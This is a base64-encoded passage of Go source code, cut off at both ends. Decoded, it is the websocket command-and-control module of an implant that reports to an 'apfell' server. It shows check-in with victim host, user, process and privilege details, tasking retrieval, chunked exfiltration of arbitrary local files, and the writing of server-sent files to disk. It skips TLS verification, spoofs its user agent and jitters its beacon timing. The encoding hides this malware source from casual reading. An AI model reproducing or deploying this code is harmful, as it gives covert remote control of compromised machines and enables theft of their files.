9vbAoJQXBmZWxsSUQgICAgICAgc3RyaW5nCglVc2VyQWdlbnQgICAgICBzdHJpbmcKCVVVSUQgICAgICAgICAgIHN0cmluZwoJS2V5ICAgICAgICAgc3RyaW5nCglSc2FQcml2YXRlS2V5ICAqcnNhLlByaXZhdGVLZXkKCUNvbm4gICAgICAgICAgICp3ZWJzb2NrZXQuQ29ubgoJRW5kcG9pbnQgCSBzdHJpbmcKfQoKZnVuYyBuZXdQcm9maWxlKCkgUHJvZmlsZSB7CglyZXR1cm4gJkMyV2Vic29ja2V0c3t9Cn0KCmZ1bmMgKGMgQzJXZWJzb2NrZXRzKSBnZXRTbGVlcFRpbWUoKSBpbnR7CiAgICByZXR1cm4gYy5JbnRlcnZhbCArIGludChtYXRoLlJvdW5kKChmbG9hdDY0KGMuSW50ZXJ2YWwpICogKHNlZWRlZFJhbmQuRmxvYXQ2NCgpICogZmxvYXQ2NChjLkppdHRlcikpL2Zsb2F0NjQoMTAwLjApKSkpOwp9CgpmdW5jIChjIEMyV2Vic29ja2V0cykgU2xlZXBJbnRlcnZhbCgpIGludCB7CglyZXR1cm4gYy5nZXRTbGVlcFRpbWUoKQp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIFNldFNsZWVwSW50ZXJ2YWwoaW50ZXJ2YWwgaW50KSB7CgljLkludGVydmFsID0gaW50ZXJ2YWwKfQoKZnVuYyAoYyAqQzJXZWJzb2NrZXRzKSBTZXRTbGVlcEppdHRlcihqaXR0ZXIgaW50KXsKICAgIGMuSml0dGVyID0gaml0dGVyCn0KCmZ1bmMgKGMgQzJXZWJzb2NrZXRzKSBBcGZJRCgpIHN0cmluZyB7CglyZXR1cm4gYy5BcGZlbGxJRAp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIFNldEFwZmVsbElEKG5ld0FwZiBzdHJpbmcpIHsKCWMuQXBmZWxsSUQgPSBuZXdBcGYKfQoKZnVuYyAoYyBDMldlYnNvY2tldHMpIFByb2ZpbGVUeXBlKCkgc3RyaW5nIHsKCXQgOj0gcmVmbGVjdC5UeXBlT2YoYykKCXJldHVybiB0Lk5hbWUoKQp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIENoZWNrSW4oaXAgc3RyaW5nLCBwaWQgaW50LCB1c2VyIHN0cmluZywgaG9zdCBzdHJpbmcsIG9wZXJhdGluZ3N5c3RlbSBzdHJpbmcsIGFyY2ggc3RyaW5nKSBpbnRlcmZhY2V7fSB7CgkvLyBTZXQgdGhlIEMyIFByb2ZpbGUgdmFsdWVzCgljLkJhc2VVUkwgPSBDb25maWcuQmFzZVVSTAoJYy5JbnRlcnZhbCA9IENvbmZpZy5TbGVlcAoJYy5KaXR0ZXIgPSBDb25maWcuSml0dGVyCgoJaWYgc3RyaW5ncy5Db250YWlucyhDb25maWcuS0VZWCwgIlQiKSB7CgkJYy5FeGNoYW5naW5nS2V5cyA9IHRydWUKCX0gZWxzZSB7CgkJYy5FeGNoYW5naW5nS2V5cyA9IGZhbHNlCgl9CgoJaWYgbGVuKENvbmZpZy5LZXkpID4gMCB7CgkJYy5LZXkgPSBDb25maWcuS2V5Cgl9IGVsc2UgewoJCWMuS2V5ID0gIiIKCX0KCglpZiBsZW4oQ29uZmlnLkhvc3RIZWFkZXIpID4gMCB7CgkJYy5Ib3N0SGVhZGVyID0gQ29uZmlnLkhvc3RIZWFkZXIKCX0KCglpZiBsZW4oQ29uZmlnLlVzZXJBZ2VudCkgPiAwIHsKCQljLlVzZXJBZ2VudCA9IENvbmZpZy5Vc2VyQWdlbnQKCX0gZWxzZSB7CgkJYy5Vc2VyQWdlbnQgPSAiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgVTsgSW50ZWwgTWFjIE9TIFg7IGVuKSBBcHBsZVdlYktpdC80MTkuMyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MTkuMyIKCX0KCgljLkVuZHBvaW50ID0gQ29uZmlnLkVuZHBvaW50CgoJLy8gRXN0YWJsaXNoIGEgY29ubmVjdGlvbiB0byB0aGUgd2Vic29ja2V0cyBzZXJ2ZXIKCXVybCA6PSBmbXQuU3ByaW50ZigiJXMlcyIsIGMuQmFzZVVSTCwgQ29uZmlnLkVuZHBvaW50KQoJaGVhZGVyIDo9IG1ha2UoaHR0cC5IZWFkZXIpCgloZWFkZXIuU2V0KCJVc2VyLUFnZW50IiwgYy5Vc2VyQWdlbnQpCgkKCS8vIFNldCB0aGUgaG9zdCBoZWFkZXIKCWlmIChsZW4oYy5Ib3N0SGVhZGVyKSA+IDApIHsKCQloZWFkZXIuU2V0KCJIb3N0IiwgYy5Ib3N0SGVhZGVyKQoJfQoJCglkIDo9IHdlYnNvY2tldC5EaWFsZXJ7CgkJVExTQ2xpZW50Q29uZmlnOiAmdGxzLkNvbmZpZ3sKCQkJSW5zZWN1cmVTa2lwVmVyaWZ5OiB0cnVlLAoJCX0sCgl9Cgljb25uZWN0aW9uLCBfLCBlcnIgOj0gZC5EaWFsKHVybCwgaGVhZGVyKQoKCWlmIGVyciAhPSBuaWwgewoJCS8vbG9nLlByaW50ZigiRXJyb3IgY29ubmVjdGluZyB0byBzZXJ2ZXIgJXMgIiwgZXJyLkVycm9yKCkpCgkJcmV0dXJuIHN0cnVjdHMuQ2hlY2tJbk1lc3NhZ2VSZXNwb25zZXtBY3Rpb246ICJjaGVja2luIiwgU3RhdHVzOiAiZmFpbGVkIn0KCX0KCgljLkNvbm4gPSBjb25uZWN0aW9uCgoJLy9sb2cuUHJpbnRsbigiQ29ubmVjdGVkIHRvIHNlcnZlciAiKQoJdmFyIHJlc3AgW11ieXRlCgoJYy5VVUlEID0gVVVJRAoJYy5BcGZlbGxJRCA9IGMuVVVJRAoJY2hlY2tpbiA6PSBzdHJ1Y3RzLkNoZWNrSW5NZXNzYWdle30KCWNoZWNraW4uQWN0aW9uID0gImNoZWNraW4iCgljaGVja2luLlVzZXIgPSB1c2VyCgljaGVja2luLkhvc3QgPSBob3N0CgljaGVja2luLklQID0gaXAKCWNoZWNraW4uUGlkID0gcGlkCgljaGVja2luLlVVSUQgPSBjLlVVSUQKCWNoZWNraW4uT1MgPSBvcGVyYXRpbmdzeXN0ZW0KCWNoZWNraW4uQXJjaGl0ZWN0dXJlID0gYXJjaAoJaWYgZnVuY3Rpb25zLklzRWxldmF0ZWQoKSB7CgkJY2hlY2tpbi5JbnRlZ3JpdHlMZXZlbCA9IDMKCX0gZWxzZSB7CgkJY2hlY2tpbi5JbnRlZ3JpdHlMZXZlbCA9IDIKCX0KCWNoZWNraW5Nc2csIF8gOj0ganNvbi5NYXJzaGFsKGNoZWNraW4pCgoJaWYgYy5FeGNoYW5naW5nS2V5cyB7CgkJXyA9IGMuTmVnb3RpYXRlS2V5KCkKCX0KCglyZXNwID0gYy5zZW5kRGF0YSgiIiwgY2hlY2tpbk1zZykKCXJlc3BvbnNlIDo9IHN0cnVjdHMuQ2hlY2tJbk1lc3NhZ2VSZXNwb25zZXt9CgllcnIgPSBqc29uLlVubWFyc2hhbChyZXNwLCAmcmVzcG9uc2UpCglpZiBlcnIgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkVycm9yIHVubWFyc2hhbGluZyByZXNwb25zZTogJXMiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gc3RydWN0cy5DaGVja0luTWVzc2FnZVJlc3BvbnNle1N0YXR1czogImZhaWxlZCJ9Cgl9CgoJaWYgbGVuKHJlc3BvbnNlLklEKSA+IDAgewoJCWMuQXBmZWxsSUQgPSByZXNwb25zZS5JRAoJfQoKCXJldHVybiByZXNwb25zZQp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIEdldFRhc2tpbmcoKSBpbnRlcmZhY2V7fSB7CglyZXF1ZXN0IDo9IHN0cnVjdHMuVGFza1JlcXVlc3RNZXNzYWdle30KCXJlcXVlc3QuQWN0aW9uID0gImdldF90YXNraW5nIgoJcmVxdWVzdC5UYXNraW5nU2l6ZSA9IC0xCgoJcmF3LCBlcnIgOj0ganNvbi5NYXJzaGFsKHJlcXVlc3QpCgoJaWYgZXJyICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRmKCJFcnJvciB1bm1hcnNoYWxsaW5nOiAlcyIsIGVyci5FcnJvcigpKQoJfQoKCXJhd1Rhc2sgOj0gYy5zZW5kRGF0YSgiIiwgcmF3KQoJdGFzayA6PSBzdHJ1Y3RzLlRhc2tSZXF1ZXN0TWVzc2FnZVJlc3BvbnNle30KCWVyciA9IGpzb24uVW5tYXJzaGFsKHJhd1Rhc2ssICZ0YXNrKQoKCWlmIGVyciAhPSBuaWwgewoJCS8vbG9nLlByaW50ZigiRXJyb3IgdW5tYXJzaGFsbGluZyB0YXNrIGRhdGE6ICVzIiwgZXJyLkVycm9yKCkpCgkJcmV0dXJuIHRhc2sKCX0KCglyZXR1cm4gdGFzawp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIFBvc3RSZXNwb25zZShvdXRwdXQgW11ieXRlLCBza2lwQ2h1bmtpbmcgYm9vbCkgW11ieXRlIHsKCXJldHVybiBjLnNlbmREYXRhKCIiLCBvdXRwdXQpCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgU2VuZEZpbGUodGFzayBzdHJ1Y3RzLlRhc2ssIHBhcmFtcyBzdHJpbmcsIGNoIGNoYW4gW11ieXRlKSB7CgoJcGF0aCA6PSB0YXNrLlBhcmFtcwoJLy8gR2V0IHRoZSBmaWxlIHNpemUgZmlyc3QgYW5kIHRoZW4gdGhlICMgb2YgY2h1bmtzIHJlcXVpcmVkCglmaWxlLCBlcnIgOj0gb3MuT3BlbihwYXRoKQoKCWlmIGVyciAhPSBuaWwgewoJCWVyclJlc3BvbnNlIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQllcnJSZXNwb25zZS5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJCWVyclJlc3BvbnNlLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRXJyb3Igb3BlbmluZyBmaWxlOiAlcyIsIGVyci5FcnJvcigpKQoJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQltdS5Mb2NrKCkKCQlUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVyclJlc3BvbnNlRW5jKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJZmksIGVyciA6PSBmaWxlLlN0YXQoKQoJaWYgZXJyICE9IG5pbCB7CgkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciBnZXR0aW5nIGZpbGUgc2l6ZTogJXMiLCBlcnIuRXJyb3IoKSkKCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCXNpemUgOj0gZmkuU2l6ZSgpCglyYXcgOj0gbWFrZShbXWJ5dGUsIHNpemUpCglfLCBlcnIgPSBmaWxlLlJlYWQocmF3KQoJaWYgZXJyICE9IG5pbCB7CgkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciByZWFkaW5nIGZpbGU6ICVzIiwgZXJyLkVycm9yKCkpCgkJZXJyUmVzcG9uc2VFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3BvbnNlKQoJCW11LkxvY2soKQoJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglfID0gZmlsZS5DbG9zZSgpCgoJYy5TZW5kRmlsZUNodW5rcyh0YXNrLCByYXcsIGNoKQp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIEdldEZpbGUodGFzayBzdHJ1Y3RzLlRhc2ssIGZpbGVEZXRhaWxzIHN0cnVjdHMuRmlsZVVwbG9hZFBhcmFtcywgY2ggY2hhbiBbXWJ5dGUpIHsKCgoJZmlsZVVwbG9hZE1zZyA6PSBzdHJ1Y3RzLkZpbGVVcGxvYWRDaHVua01lc3NhZ2V7fSAvL0NyZWF0ZSB0aGUgZmlsZSB1cGxvYWQgY2h1bmsgbWVzc2FnZQoJZmlsZVVwbG9hZE1zZy5BY3Rpb24gPSAidXBsb2FkIgoJZmlsZVVwbG9hZE1zZy5GaWxlSUQgPSBmaWxlRGV0YWlscy5GaWxlSUQKCWZpbGVVcGxvYWRNc2cuQ2h1bmtTaXplID0gMTAyNDAwMAoJZmlsZVVwbG9hZE1zZy5DaHVua051bSA9IDEKCWZpbGVVcGxvYWRNc2cuRnVsbFBhdGggPSBmaWxlRGV0YWlscy5SZW1vdGVQYXRoCglmaWxlVXBsb2FkTXNnLlRhc2tJRCA9IHRhc2suVGFza0lECgoJbXNnLCBfIDo9IGpzb24uTWFyc2hhbChmaWxlVXBsb2FkTXNnKQoJbXUuTG9jaygpCglVcGxvYWRSZXNwb25zZXMgPSBhcHBlbmQoVXBsb2FkUmVzcG9uc2VzLCBtc2cpCgltdS5VbmxvY2soKQoJLy8gV2FpdCBmb3IgcmVzcG9uc2UgZnJvbSBhcGZlbGwKCXJhd0RhdGEgOj0gPC1jaAoKCWZpbGVVcGxvYWRNc2dSZXNwb25zZSA6PSBzdHJ1Y3RzLkZpbGVVcGxvYWRDaHVua01lc3NhZ2VSZXNwb25zZXt9IC8vIFVubWFyc2hhbCB0aGUgZmlsZSB1cGxvYWQgcmVzcG9uc2UgZnJvbSBhcGZlbGwKCWVyciA6PSBqc29uLlVubWFyc2hhbChyYXdEYXRhLCAmZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlKQoJaWYgZXJyICE9IG5pbCB7CgkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciB1bm1hcnNoYWxpbmcgdGFzayByZXNwb25zZTogJXMiLCBlcnIuRXJyb3IoKSkKCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCWYsIGVyciA6PSBvcy5DcmVhdGUoZmlsZURldGFpbHMuUmVtb3RlUGF0aCkKCWlmIGVyciAhPSBuaWwgewoJCWVyclJlc3BvbnNlIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQllcnJSZXNwb25zZS5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJCWVyclJlc3BvbnNlLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRXJyb3IgY3JlYXRpbmcgZmlsZTogJXMiLCBlcnIuRXJyb3IoKSkKCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoJZGVmZXIgZi5DbG9zZSgpCglkZWNvZGVkLCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlLkNodW5rRGF0YSkKCglfLCBlcnIgPSBmLldyaXRlKGRlY29kZWQpCgoJaWYgZXJyICE9IG5pbCB7CgkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciB3cml0aW5nIHRvIGZpbGU6ICVzIiwgZXJyLkVycm9yKCkpCgkJZXJyUmVzcG9uc2VFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3BvbnNlKQoJCW11LkxvY2soKQoJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglvZmZzZXQgOj0gaW50NjQobGVuKGRlY29kZWQpKQoJaWYgZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlLlRvdGFsQ2h1bmtzID4gMSB7CgkJZm9yIGluZGV4IDo9IDI7IGluZGV4IDw9IGZpbGVVcGxvYWRNc2dSZXNwb25zZS5Ub3RhbENodW5rczsgaW5kZXgrKyB7CgkJCWZpbGVVcGxvYWRNc2cgPSBzdHJ1Y3RzLkZpbGVVcGxvYWRDaHVua01lc3NhZ2V7fQoJCQlmaWxlVXBsb2FkTXNnLkFjdGlvbiA9ICJ1cGxvYWQiCgkJCWZpbGVVcGxvYWRNc2cuQ2h1bmtOdW0gPSBpbmRleAoJCQlmaWxlVXBsb2FkTXNnLkNodW5rU2l6ZSA9IDEwMjQwMDAKCQkJZmlsZVVwbG9hZE1zZy5GaWxlSUQgPSBmaWxlRGV0YWlscy5GaWxlSUQKCQkJZmlsZVVwbG9hZE1zZy5GdWxsUGF0aCA9IGZpbGVEZXRhaWxzLlJlbW90ZVBhdGgKCQkJZmlsZVVwbG9hZE1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoKCQkJbXNnLCBfIDo9IGpzb24uTWFyc2hhbChmaWxlVXBsb2FkTXNnKQoJCQltdS5Mb2NrKCkKCQkJVXBsb2FkUmVzcG9uc2VzID0gYXBwZW5kKFVwbG9hZFJlc3BvbnNlcywgbXNnKQoJCQltdS5VbmxvY2soKQoJCQlyYXdEYXRhIDo9IDwtY2gKCgkJCWZpbGVVcGxvYWRNc2dSZXNwb25zZSA9IHN0cnVjdHMuRmlsZVVwbG9hZENodW5rTWVzc2FnZVJlc3BvbnNle30gLy8gVW5tYXJzaGFsIHRoZSBmaWxlIHVwbG9hZCByZXNwb25zZSBmcm9tIGFwZmVsbAoJCQllcnIgOj0ganNvbi5Vbm1hcnNoYWwocmF3RGF0YSwgJmZpbGVVcGxvYWRNc2dSZXNwb25zZSkKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQkJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQkJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIG1hcnNoYWxpbmcgcmVzcG9uc2U6ICVzIiwgZXJyLkVycm9yKCkpCgkJCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJCQltdS5Mb2NrKCkKCQkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJCQltdS5VbmxvY2soKQoJCQkJcmV0dXJuCgkJCX0KCgkJCWRlY29kZWQsIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhmaWxlVXBsb2FkTXNnUmVzcG9uc2UuQ2h1bmtEYXRhKQoKCQkJXywgZXJyID0gZi5Xcml0ZUF0KGRlY29kZWQsIG9mZnNldCkKCgkJCWlmIGVyciAhPSBuaWwgewoJCQkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJCQllcnJSZXNwb25zZS5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJCQkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciB3cml0aW5nIHRvIGZpbGU6ICVzIiwgZXJyLkVycm9yKCkpCgkJCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJCQltdS5Mb2NrKCkKCQkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJCQltdS5VbmxvY2soKQoJCQkJcmV0dXJuCgkJCX0KCgkJCW9mZnNldCA9IG9mZnNldCArIGludDY0KGxlbihkZWNvZGVkKSkKCQl9Cgl9CgoJcmVzcCA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCXJlc3AuVXNlck91dHB1dCA9ICJGaWxlIHVwbG9hZCBjb21wbGV0ZSIKCXJlc3AuQ29tcGxldGVkID0gdHJ1ZQoJcmVzcC5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJZW5jUmVzcCwgZXJyIDo9IGpzb24uTWFyc2hhbChyZXNwKQoJbXUuTG9jaygpCglUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVuY1Jlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgU2VuZEZpbGVDaHVua3ModGFzayBzdHJ1Y3RzLlRhc2ssIGZpbGVEYXRhIFtdYnl0ZSwgY2ggY2hhbiBbXWJ5dGUpIHsKCXNpemUgOj0gbGVuKGZpbGVEYXRhKQoKCWNvbnN0IGZpbGVDaHVuayA9IDUxMjAwMCAvL05vcm1hbCBhcGZlbGwgY2h1bmsgc2l6ZQoJY2h1bmtzIDo9IHVpbnQ2NChtYXRoLkNlaWwoZmxvYXQ2NChzaXplKSAvIGZpbGVDaHVuaykpCgljaHVua1Jlc3BvbnNlIDo9IHN0cnVjdHMuRmlsZURvd25sb2FkSW5pdGlhbE1lc3NhZ2V7fQoJY2h1bmtSZXNwb25zZS5OdW1DaHVua3MgPSBpbnQoY2h1bmtzKQoJY2h1bmtSZXNwb25zZS5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJY2h1bmtSZXNwb25zZS5GdWxsUGF0aCA9IHRhc2suUGFyYW1zCgltc2csIF8gOj0ganNvbi5NYXJzaGFsKGNodW5rUmVzcG9uc2UpCgltdS5Mb2NrKCkKCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgbXNnKQoJbXUuVW5sb2NrKCkKCS8vIFdhaXQgZm9yIGEgcmVzcG9uc2UgZnJvbSB0aGUgY2hhbm5lbAoJcmVzcCA6PSA8LWNoCgl2YXIgZmlsZURldGFpbHMgbWFwW3N0cmluZ11pbnRlcmZhY2V7fQoKCWVyciA6PSBqc29uLlVubWFyc2hhbChyZXNwLCAmZmlsZURldGFpbHMpCglpZiBlcnIgIT0gbmlsIHsKCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIHVubWFyc2hhbGluZyB0YXNrIHJlc3BvbnNlOiAlcyIsIGVyci5FcnJvcigpKQoJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQkKCQltdS5Mb2NrKCkKCQlUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVyclJlc3BvbnNlRW5jKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CglyIDo9IGJ5dGVzLk5ld0J1ZmZlcihmaWxlRGF0YSkKCS8vIFNsZWVwIGhlcmUgc28gd2UgZG9uJ3Qgc3BhbSBhcGZlbGwKCS8vdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwoJZm9yIGkgOj0gdWludDY0KDApOyBpIDwgY2h1bmtzOyBpKysgewoJCXBhcnRTaXplIDo9IGludChtYXRoLk1pbihmaWxlQ2h1bmssIGZsb2F0NjQoaW50NjQoc2l6ZSktaW50NjQoaSpmaWxlQ2h1bmspKSkpCgkJcGFydEJ1ZmZlciA6PSBtYWtlKFtdYnl0ZSwgcGFydFNpemUpCgkJLy8gQ3JlYXRlIGEgdGVtcG9yYXJ5IGJ1ZmZlciBhbmQgcmVhZCBhIGNodW5rIGludG8gdGhhdCBidWZmZXIgZnJvbSB0aGUgZmlsZQoJCXJlYWQsIGVyciA6PSByLlJlYWQocGFydEJ1ZmZlcikKCQlpZiBlcnIgIT0gbmlsIHx8IHJlYWQgPT0gMCB7CgkJCWJyZWFrCgkJfQoKCQltc2cgOj0gc3RydWN0cy5GaWxlRG93bmxvYWRDaHVua01lc3NhZ2V7fQoJCW1zZy5DaHVua051bSA9IGludChpKSArIDEKCQltc2cuRmlsZUlEID0gZmlsZURldGFpbHNbImZpbGVfaWQiXS4oc3RyaW5nKQoJCW1zZy5DaHVua0RhdGEgPSBiYXNlNjQuU3RkRW5jb2RpbmcuRW5jb2RlVG9TdHJpbmcocGFydEJ1ZmZlcikKCQltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCgkJZW5jbXNnLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlbmNtc2cpCgkJbXUuVW5sb2NrKCkKCgkJLy8gV2FpdCBmb3IgYSByZXNwb25zZSBmb3Igb3VyIGZpbGUgY2h1bmsKCQlkZWNSZXNwIDo9IDwtY2gKCgkJdmFyIHBvc3RSZXNwIG1hcFtzdHJpbmddaW50ZXJmYWNle30KCQllcnIgPSBqc29uLlVubWFyc2hhbChkZWNSZXNwLCAmcG9zdFJlc3ApCgkJaWYgZXJyICE9IG5pbCB7CgkJCWVyclJlc3BvbnNlIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJCWVyclJlc3BvbnNlLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRXJyb3IgdW5tYXJzaGFsaW5nIHRhc2sgcmVzcG9uc2U6ICVzIiwgZXJyLkVycm9yKCkpCgkJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQkJbXUuTG9jaygpCgkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJCW11LlVubG9jaygpCgkJCXJldHVybgoJCX0KCQkKCgkJaWYgIXN0cmluZ3MuQ29udGFpbnMocG9zdFJlc3BbInN0YXR1cyJdLihzdHJpbmcpLCAic3VjY2VzcyIpIHsKCQkJLy8gSWYgdGhlIHBvc3Qgd2FzIG5vdCBzdWNjZXNzZnVsLCB3YWl0IGFuZCB0cnkgdG8gc2VuZCBpdCBvbmUgbW9yZSB0aW1lCgkJCQoJCQltdS5Mb2NrKCkKCQkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlbmNtc2cpCgkJCW11LlVubG9jaygpCgkJfQoKCQl0aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCkKCX0KCS8vIFJlc2V0IHRoZSBidWZmZXIgdG8gYmUgZW1wdHkKCXIuUmVzZXQoKQoJciA9IG5pbAoJZmlsZURhdGEgPSBuaWwKCglmaW5hbCA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCWZpbmFsLkNvbXBsZXRlZCA9IHRydWUKCWZpbmFsLlRhc2tJRCA9IHRhc2suVGFza0lECglmaW5hbC5Vc2VyT3V0cHV0ID0gImZpbGUgZG93bmxvYWRlZCIKCWZpbmFsRW5jLCBfIDo9IGpzb24uTWFyc2hhbChmaW5hbCkKCS8vYy5Qb3N0UmVzcG9uc2UodGFzaywgc3RyaW5nKGZpbmFsRW5jKSkKCW11LkxvY2soKQoJVGF